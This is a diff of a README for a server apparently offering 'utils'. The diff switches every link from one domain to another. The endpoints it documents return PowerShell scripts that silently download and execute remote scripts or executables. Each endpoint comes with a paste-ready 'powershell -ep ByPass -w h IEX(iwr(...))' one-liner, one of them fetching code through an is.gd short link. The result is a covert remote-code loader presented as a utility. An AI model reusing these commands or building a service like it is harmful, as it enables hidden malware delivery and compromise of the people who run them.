@@ -7,31 +7,31 @@ This is a server which runs utils for various project
 
 # Endpoints
 
-## [/pshid](https://vercelutilsserver.totallysafe.ch/exehid)
+## [/pshid](https://vercelutilsserver.gymthun.com/exehid)
 
 returns a powershell script, downloads and executes a powershell script without a window
 
 
-example: [`/pshid?url=is.gd/tuioh`](https://vercelutilsserver.totallysafe.ch/pshid?url=is.gd%2Ftuioh)
+example: [`/pshid?url=is.gd/tuioh`](https://vercelutilsserver.gymthun.com/pshid?url=is.gd%2Ftuioh)
 
 which can be executed with 
 ```shell
-powershell -ep ByPass "IEX(iwr('https://vercelutilsserver.totallysafe.ch/pshid?url=is.gd%2Ftuioh'))"
+powershell -ep ByPass "IEX(iwr('https://vercelutilsserver.gymthun.com/pshid?url=is.gd%2Ftuioh'))"
 ```
 
-## [/exehid](https://vercelutilsserver.totallysafe.ch/exe2ps1)
+## [/exehid](https://vercelutilsserver.gymthun.com/exe2ps1)
 
 downloads and runs an executable via pshid
 
 
-example: [`/exehid?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)
+example: [`/exehid?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)
 
 which can be executed with 
 ```shell
-powershell -ep ByPass "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
+powershell -ep ByPass "IEX(iwr('https://vercelutilsserver.gymthun.com/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
 ```
 
-## [/exe2ps1](https://vercelutilsserver.totallysafe.ch/exe2ps1)
+## [/exe2ps1](https://vercelutilsserver.gymthun.com/exe2ps1)
 
 <details>
 <summary>Details</summary>
@@ -39,10 +39,10 @@ powershell -ep ByPass "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?
 returns a powershell script, which downloads and runs an executable from `param:url` with all `param:arg` passed
 
 
-example: [`/exe2ps1?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)
+example: [`/exe2ps1?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.gymthun.com/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)
 
 which can be executed with 
 ```shell
-powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
+powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.gymthun.com/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
 ```
 </details>
